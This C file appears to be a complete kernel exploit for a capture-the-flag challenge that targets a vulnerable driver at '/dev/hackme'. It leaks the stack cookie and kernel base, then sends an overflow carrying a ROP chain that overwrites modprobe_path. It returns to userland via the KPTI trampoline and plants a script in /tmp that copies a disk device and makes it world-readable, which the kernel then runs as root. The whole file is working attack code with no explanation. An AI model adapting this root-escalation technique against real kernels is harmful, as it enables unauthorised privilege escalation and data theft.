#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <linux/userfaultfd.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>

int fd;

unsigned long cookie;
unsigned long image_base;
unsigned long kpti_trampoline;
unsigned long pop_rax_ret;
unsigned long pop_rbx_r12_rbp_ret;
unsigned long write_ptr_rbx_rax_pop2_ret;
unsigned long modprobe_path;

void get_flag();

unsigned long user_cs, user_ss, user_rflags, user_sp;

void open_dev(){
    fd = open("/dev/hackme", O_RDWR);
    if(fd < 0){
        puts("[!] Failed to open device");
        exit(1);
    }else{
        puts("[*] Opened device");
    }
}

void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

void leak(){
    int n = 40;
    unsigned long leak[n];
    ssize_t r = read(fd, leak, sizeof(leak));
    // print_leak(leak, n);
    cookie = leak[16];
    image_base = leak[38] - 0xa157UL;
    modprobe_path = image_base + 0x1061820UL;
    kpti_trampoline = image_base + 0x200f10UL + 22;
    pop_rax_ret = image_base + 0x4d11UL;
    pop_rbx_r12_rbp_ret = image_base + 0x3190UL;
    write_ptr_rbx_rax_pop2_ret = image_base + 0x306dUL;

    printf("[*] Leaked %zd bytes\n", r);
    printf("[+] Cookie: %lx\n", cookie);
    printf("[+] Image base: %lx\n", image_base);
}

void overflow(){
    int n = 50;
    unsigned long payload[n];
    int off = 16;

    payload[off++] = cookie;
    payload[off++] = 0x0;
    payload[off++] = 0x0;
    payload[off++] = 0x0;
    payload[off++] = pop_rax_ret;
    payload[off++] = 0x782f706d742f;
    payload[off++] = pop_rbx_r12_rbp_ret;
    payload[off++] = modprobe_path;
    payload[off++] = 0x0;
    payload[off++] = 0x0;
    payload[off++] = write_ptr_rbx_rax_pop2_ret;
    payload[off++] = 0x0;
    payload[off++] = 0x0;
    payload[off++] = kpti_trampoline;
    payload[off++] = 0x0;
    payload[off++] = 0x0;
    payload[off++] = (unsigned long)get_flag;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    puts("[*] Prepared payload to overwrite modprobe_path");
    ssize_t w = write(fd, payload, sizeof(payload));
}

void get_flag(){
    puts("[*] Returned to userland, setting up for fake modprobe");

    system("echo '#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[*] Run unknown file");
    system("/tmp/dummy");

    puts("[*] Hopefully flag is readable");
    system("cat /tmp/flag");

    exit(0);
}

int main(){
    save_state();
    open_dev();
    leak();
    overflow();
    return 0;
}
